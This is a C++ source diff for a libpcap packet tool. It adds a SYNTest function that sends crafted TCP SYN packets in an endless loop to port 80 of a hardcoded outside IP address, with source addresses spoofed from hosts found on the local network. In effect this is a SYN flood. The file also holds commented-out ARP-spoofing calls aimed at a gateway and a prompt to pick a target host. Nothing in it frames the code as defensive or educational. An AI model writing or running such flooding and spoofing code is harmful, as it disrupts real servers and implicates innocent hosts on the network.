@@ -131,18 +131,35 @@ pcap_t * openDevice(pcap_if_t * device,unsigned int package_size){
 	return fp;
 }
 void send_raw_package(pcap_t * fp,u_char * packet,int packet_size,int times=1){
-
-		char errbuf[PCAP_ERRBUF_SIZE];
-		/* Send down the packet */
-		while(times--){
-			//rand_source_ip_mac(packet);
-			if (pcap_sendpacket(fp, packet, packet_size ) != 0)
-			{
-				fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
-				return;
-			}
+	char errbuf[PCAP_ERRBUF_SIZE];
+	/* Send down the packet */
+	while(times--){
+		//rand_source_ip_mac(packet);
+		if (pcap_sendpacket(fp, packet, packet_size ) != 0)
+		{
+			fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
+			return;
 		}
-		return;
+	}
+	return;
+}
+void SYNTest(HostManager & manager,pcap_t * fp){
+	printf("SYN_Test Begin:\n");
+	while(1){
+		if(rand()%1000==0)printf(".");
+	int port_rand=rand();
+	unsigned int id_rand=rand();
+	Host tmp_host=manager.getHost(rand()%(manager.host_number));
+	Package pack;
+	pack.create(sizeof(MACHeader)+sizeof(IPHeader)+sizeof(TCPHeader)+12);
+	char * mac_data=pack.addSection(sizeof(MACHeader));
+	MAC_MakePackage(mac_data,tmp_host.mac,getMAC("d8:49:0b:b8:4a:1b"),MAC_PROTOCOL_TYPE_IP);
+	char * ip_data=pack.addSection(sizeof(IPHeader));
+	IP_MakePackage(ip_data,sizeof(IPHeader),tmp_host.IP,getIP("202.113.16.32"),id_rand,IPPROTO_TCP,sizeof(IPHeader)+sizeof(TCPHeader)+12);
+	IPHeader * iph=(IPHeader *)ip_data;
+	TCP_MakePackage(&pack,port_rand%3000+6000,80,((ULONG)rand())<<8+rand());
+	send_raw_package(fp,(u_char *)pack.data,pack.length,1);
+	}
 }
 
 int main(){
@@ -153,11 +170,13 @@ int main(){
 	unsigned int package_size=sizeof(MACHeader)+sizeof(IPHeader)+sizeof(ICMPHeader);
 	char * pData=new char[package_size];
 	pcap_t * fp=openDevice(alldevs,package_size);
+
 	HostManager manager;
 	//ARP_cheat(fp,getIP("10.2.124.34"),getIP("10.2.124.1"),getMAC("1c:b0:94:bc:0c:f1"),getMAC("1c:b0:94:bc:0c:f0"),getMAC("d8:49:0b:b8:4a:1b"));
 	//ARP_cheat(fp,getIP("10.2.124.34"),getIP("10.2.124.1"),getMAC("78-45-C4-B8-12-CE"),getMAC("1c:b0:94:bc:0c:f0"),getMAC("d8:49:0b:b8:4a:1b"));
 	HostScan(fp,manager,getIP(myIP),temp_ip,getMAC(myMAC));
 	SetColor(3);
+	SYNTest(manager,fp);
 	int phone_idx=manager.getHostByMAC(getMAC(myPhoneMAC));
 	printf("My HTC Phone's ID:%d\n",phone_idx);
 	Host * target_host=&manager.host_list[manager.selectHost("Please Select Your TARGET:")];
